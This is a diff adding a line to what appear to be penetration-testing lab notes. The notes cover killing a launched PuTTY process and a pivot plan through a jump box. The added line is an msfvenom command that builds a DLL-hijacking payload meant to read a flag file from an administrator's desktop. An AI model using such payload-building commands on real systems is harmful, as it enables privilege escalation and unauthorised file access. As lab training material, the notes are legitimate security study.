@@ -10,6 +10,7 @@ ________________________________________________________________________________
 ### To kill the putty.exe we downloaded and launched.
     (get-process | ?{$_.name -like "putty"}).kill()
 ____________________________________________________________________________________________________________________
+    msfvenom -p windows/exec CMD='cmd.exe /C "type C:\users\Admin\Desktop\flag.txt" > C:\Users\comrade.WIN2-INTERNAL-D\Desktop\lookwhatifound.txt' -f dll > hijackmeplz.dll
 # Scheme of Maneuver:
 ## >Jump Box
 ## ->Pivot: 192.168.28.105
